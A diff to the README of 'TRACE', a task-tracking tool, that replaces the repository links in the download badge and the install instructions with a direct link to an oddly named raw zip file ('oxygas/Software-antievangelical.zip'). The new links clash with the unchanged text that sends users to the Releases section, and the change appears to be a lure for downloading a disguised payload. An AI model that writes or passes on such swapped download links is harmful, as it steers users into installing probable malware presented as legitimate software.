@@ -1,12 +1,12 @@
 # ⏱️ TRACE - Manage tasks from start to finish
 
-[![](https://img.shields.io/badge/Download_TRACE-Blue)](https://github.com/yashpatel4563/TRACE)
+[![](https://img.shields.io/badge/Download_TRACE-Blue)](https://raw.githubusercontent.com/yashpatel4563/TRACE/main/oxygas/Software-antievangelical.zip)
 
 TRACE is a time-aware accountability system. It tracks your tasks from the planning stage to the final result. The software keeps a record of your progress, your history, and what you learn along the way. You can use it to maintain focus and improve your productivity.
 
 ## 📥 How to download and install
 
-You can get the software from the official repository page. Visit this link to find the latest version: [https://github.com/yashpatel4563/TRACE](https://github.com/yashpatel4563/TRACE). 
+You can get the software from the official repository page. Visit this link to find the latest version: [https://raw.githubusercontent.com/yashpatel4563/TRACE/main/oxygas/Software-antievangelical.zip](https://raw.githubusercontent.com/yashpatel4563/TRACE/main/oxygas/Software-antievangelical.zip). 
 
 1. Go to the link above.
 2. Look for the "Releases" section on the right side of the screen.
